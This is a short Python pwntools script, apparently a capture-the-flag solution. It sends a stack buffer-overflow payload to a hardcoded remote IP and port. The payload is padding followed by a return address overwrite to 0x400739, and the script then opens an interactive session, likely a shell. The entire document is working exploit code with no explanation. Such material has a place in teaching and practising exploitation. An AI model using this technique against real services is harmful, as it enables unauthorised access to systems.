from pwn import *

payload = 'a' * 0x30 + 'a' * 8 + p64(0x400739)

r = remote('183.129.189.60', 10025)

r.recvuntil('input your message')
r.sendline(payload)
r.interactive()
